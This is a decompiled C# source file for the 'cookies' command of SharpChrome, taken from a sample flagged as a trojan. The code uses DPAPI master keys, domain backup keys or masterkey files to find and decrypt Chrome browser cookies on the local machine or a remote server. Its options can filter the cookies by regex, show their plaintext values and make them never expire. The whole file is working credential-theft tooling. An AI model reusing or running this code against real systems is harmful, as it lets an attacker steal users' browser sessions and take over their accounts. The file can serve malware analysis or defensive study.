// Decompiled with JetBrains decompiler
// Type: SharpChrome.Commands.Cookies
// Assembly: SharpChrome, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D938FA4A-3611-4CA7-B3BE-AF9F6D845B7B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\VHO-Trojan.MSIL.Convagent.gen-340a639e1ec7cb2afa90a2aba177b368e13efc4dd1313e32af30b6ceb259f7d3.exe

using SharpDPAPI;
using System;
using System.Collections.Generic;
using System.IO;

namespace SharpChrome.Commands
{
  public class Cookies : ICommand
  {
    public static string CommandName => "cookies";

    public void Execute(Dictionary<string, string> arguments)
    {
      Console.WriteLine("\r\n[*] Action: Chrome Cookies Triage\r\n");
      arguments.Remove("cookies");
      string displayFormat = "csv";
      string computerName = "";
      bool showAll = false;
      bool unprotect = false;
      bool setneverexpire = false;
      string cookieRegex = "";
      string urlRegex = "";
      if (arguments.ContainsKey("/format"))
        displayFormat = arguments["/format"];
      if (arguments.ContainsKey("/cookie"))
        cookieRegex = arguments["/cookie"];
      if (arguments.ContainsKey("/url"))
        urlRegex = arguments["/url"];
      if (arguments.ContainsKey("/unprotect"))
        unprotect = true;
      if (arguments.ContainsKey("/setneverexpire"))
        setneverexpire = true;
      if (arguments.ContainsKey("/showall"))
        showAll = true;
      if (showAll)
        Console.WriteLine("[*] Triaging all cookies, including expired ones.");
      else
        Console.WriteLine("[*] Triaging non-expired cookies. Use '/showall' to display ALL cookies.");
      if (arguments.ContainsKey("/server"))
      {
        computerName = arguments["/server"];
        Console.WriteLine("[*] Triaging remote server: {0}\r\n", (object) computerName);
      }
      Dictionary<string, string> MasterKeys = new Dictionary<string, string>();
      foreach (KeyValuePair<string, string> keyValuePair in arguments)
      {
        if (!keyValuePair.Key.StartsWith("/"))
          MasterKeys.Add(keyValuePair.Key, keyValuePair.Value);
      }
      if (arguments.ContainsKey("/pvk"))
        MasterKeys = Dpapi.PVKTriage(arguments);
      else if (arguments.ContainsKey("/mkfile"))
        MasterKeys = Helpers.ParseMasterKeyFile(arguments["/mkfile"]);
      if (arguments.ContainsKey("/target"))
      {
        string str = arguments["/target"].Trim('"').Trim('\'');
        if (File.Exists(str))
        {
          Console.WriteLine("[*] Target 'Cookies' File: {0}\r\n", (object) str);
          Chrome.ParseChromeCookies(MasterKeys, str, displayFormat, showAll, unprotect, cookieRegex, urlRegex);
        }
        else
          Console.WriteLine("\r\n[X] '{0}' is not a valid file.", (object) str);
      }
      else if (arguments.ContainsKey("/server") && !arguments.ContainsKey("/pvk"))
        Console.WriteLine("[X] The '/server:X' argument must be used with '/pvk:BASE64...' !");
      else
        Chrome.TriageChromeCookies(MasterKeys, computerName, displayFormat, showAll, unprotect, cookieRegex, urlRegex, setneverexpire);
    }
  }
}
